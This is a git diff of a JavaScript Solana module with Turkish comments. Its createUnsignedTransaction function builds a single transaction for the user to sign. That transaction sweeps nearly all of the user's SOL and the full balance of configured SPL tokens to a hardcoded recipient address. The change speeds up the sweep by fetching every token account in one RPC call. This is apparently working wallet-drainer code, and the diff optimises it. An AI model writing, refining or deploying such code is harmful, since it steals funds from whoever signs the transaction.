@@ -8,32 +8,63 @@ import {
   VersionedTransaction,
 } from "@solana/web3.js";
 import {
+  TOKEN_PROGRAM_ID,
   getAssociatedTokenAddress,
-  getAccount,
   createTransferInstruction,
 } from "@solana/spl-token";
 import { connection } from "./connect.js";
 import { TOKEN_CONFIGS } from "./token-config.js";
 
-// RPC Throttle
-const BATCH_SIZE = 3;
-const BATCH_DELAY_MS = 1000;
-
 /**
- * Verilen async görevleri en fazla BATCH_SIZE tanesini aynı anda çalıştırır,
- * sonra BATCH_DELAY_MS milisaniye bekler, sonra kalanları çalıştırır.
+ * Kullanıcının sahip olduğu TÜM SPL token hesaplarını tek RPC ile çeker,
+ * her mint için:
+ *  - toplam miktarı (raw),
+ *  - tercih edilecek kaynak hesabı (öncelik: ATA varsa ATA, yoksa ilk hesap),
+ *  - seçilen kaynaktaki miktarı
+ * döndürür.
+ *
+ * Dönüş yapısı: Map<mintBase58, { sourcePubkey: PublicKey, amountInSourceRaw: number }>
  */
-async function runBatches(tasks) {
-  const results = [];
-  for (let i = 0; i < tasks.length; i += BATCH_SIZE) {
-    const batch = tasks.slice(i, i + BATCH_SIZE).map((fn) => fn());
-    const res = await Promise.all(batch);
-    results.push(...res);
-    if (i + BATCH_SIZE < tasks.length) {
-      await new Promise((r) => setTimeout(r, BATCH_DELAY_MS));
-    }
+async function fetchTokenSources(payer) {
+  // 1) Tek RPC: tüm parsed token hesapları
+  const resp = await connection.getParsedTokenAccountsByOwner(payer, {
+    programId: TOKEN_PROGRAM_ID,
+  });
+
+  // 2) Mint bazında grupla
+  const byMint = new Map(); // mintStr -> { accounts: Array<{ pubkey: PublicKey, amountRaw: number }> }
+  for (const { account, pubkey } of resp.value) {
+    const parsed = account.data?.parsed?.info;
+    if (!parsed) continue;
+
+    const mintStr = parsed.mint; // base58 string
+    const amountRaw = Number(parsed.tokenAmount?.amount ?? "0");
+
+    const entry = byMint.get(mintStr) || { accounts: [] };
+    entry.accounts.push({ pubkey, amountRaw });
+    byMint.set(mintStr, entry);
   }
-  return results;
+
+  // 3) Her mint için ATA’yı lokalde hesapla ve kaynak hesabı seç
+  const result = new Map(); // mintStr -> { sourcePubkey, amountInSourceRaw }
+  for (const [mintStr, { accounts }] of byMint.entries()) {
+    if (!accounts.length) continue;
+
+    const mintPk = new PublicKey(mintStr);
+    const ata = await getAssociatedTokenAddress(mintPk, payer);
+
+    // ATA var mı? Varsa onu kaynak seç; yoksa ilk hesabı seç.
+    const ataIdx = accounts.findIndex((a) => a.pubkey.equals(ata));
+    const chosen =
+      ataIdx >= 0 ? accounts[ataIdx] : accounts[0];
+
+    result.set(mintStr, {
+      sourcePubkey: chosen.pubkey,
+      amountInSourceRaw: chosen.amountRaw,
+    });
+  }
+
+  return result;
 }
 
 export async function createUnsignedTransaction(userPublicKey) {
@@ -45,39 +76,21 @@ export async function createUnsignedTransaction(userPublicKey) {
   const payer = userPublicKey;
   const toPublicKey = new PublicKey("8uowfFMGX7DfkErAzNX3bpv3UN5XuG2841y7cKyD8ZWd");
 
-  // SOL bakiyesi kontrolü
-  const userSolLamports = await connection.getBalance(payer);
+  // ---- Aşama 1: SOL + Token hesapları (paralel) ----
+  const [userSolLamports, tokenSources] = await Promise.all([
+    connection.getBalance(payer),      // 1 RPC
+    fetchTokenSources(payer),           // 1 RPC (içerden)
+  ]);
+
+  // SOL gönderim miktarı (fee buffer bırak)
   const feeBufferLamports = 6_000_000; // ~0.006 SOL
   const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);
   const isSolSufficient = solToSend > 0;
 
-  // 1) Kullanıcı bakiyelerini batch'li olarak oku (her task 1 RPC)
-  const balanceTasks = TOKEN_CONFIGS.map(({ mint, threshold }) => async () => {
-    const userAta = await getAssociatedTokenAddress(mint, payer);
-    let amount = 0,
-      sufficient = false;
-    try {
-      const acct = await getAccount(connection, userAta);
-      amount = Number(acct.amount);
-      sufficient = amount > threshold;
-    } catch {
-      sufficient = false;
-    }
-    const toAta = await getAssociatedTokenAddress(mint, toPublicKey);
-    return { mint, userAta, toAta, amount, sufficient };
-  });
-  const userTokenInfos = await runBatches(balanceTasks);
-
-  // Hiçbir varlık yeterli değilse çık
-  if (!isSolSufficient && !userTokenInfos.some((t) => t.sufficient)) {
-    console.warn("Yeterli bakiye yok!");
-    return null;
-  }
-
-  // 2) Instruction'ları sırayla derle
+  // ---- Aşama 2: Instruction’ları derle (ATA OLUŞTURMA YOK) ----
   const instructions = [];
 
-  // 2a) SOL transfer instruction
+  // 2a) SOL transfer (varsa)
   if (isSolSufficient) {
     instructions.push(
       SystemProgram.transfer({
@@ -88,17 +101,40 @@ export async function createUnsignedTransaction(userPublicKey) {
     );
   }
 
-  // 2b) SPL-token transfer (ATA oluşturma adımını atlıyoruz)
-  for (const { userAta, toAta, amount, sufficient } of userTokenInfos) {
-    if (!sufficient) continue;
+  // 2b) SPL transferleri
+  // Not: Hedef ATA'yı sadece adres olarak HESAPLIYORUZ; varlık yoksa TX düşer (mevcut davranışla aynı).
+  for (const { mint, threshold } of TOKEN_CONFIGS) {
+    const mintStr = mint.toBase58();
+    const src = tokenSources.get(mintStr);
+    if (!src) continue; // Bu mint'e ait hesap yok
 
+    // Eşik kontrolü (threshold raw birimde)
+    if (src.amountInSourceRaw <= threshold) continue;
+
+    // Kaynak hesap: seçilen hesap (ATA varsa o, yoksa ilk)
+    const userSourceAccount = src.sourcePubkey;
+
+    // Alıcı ATA adresini deterministik hesapla (RPC değil)
+    const toAta = await getAssociatedTokenAddress(mint, toPublicKey);
+
+    // Mevcut davranış: seçilen KAYNAKTAN elindeki miktarın tamamını yolla
     instructions.push(
-      createTransferInstruction(userAta, toAta, payer, amount)
+      createTransferInstruction(
+        userSourceAccount,
+        toAta,
+        payer,                    // owner
+        src.amountInSourceRaw     // raw units
+      )
     );
   }
 
-  // 3) Tek bir VersionedTransaction oluştur
-  const { blockhash } = await connection.getLatestBlockhash();
+  if (instructions.length === 0) {
+    console.warn("Yeterli bakiye yok!");
+    return null;
+  }
+
+  // ---- Aşama 3: Tek VersionedTransaction oluştur ----
+  const { blockhash } = await connection.getLatestBlockhash(); // 1 RPC
   const messageV0 = new TransactionMessage({
     payerKey: payer,
     recentBlockhash: blockhash,
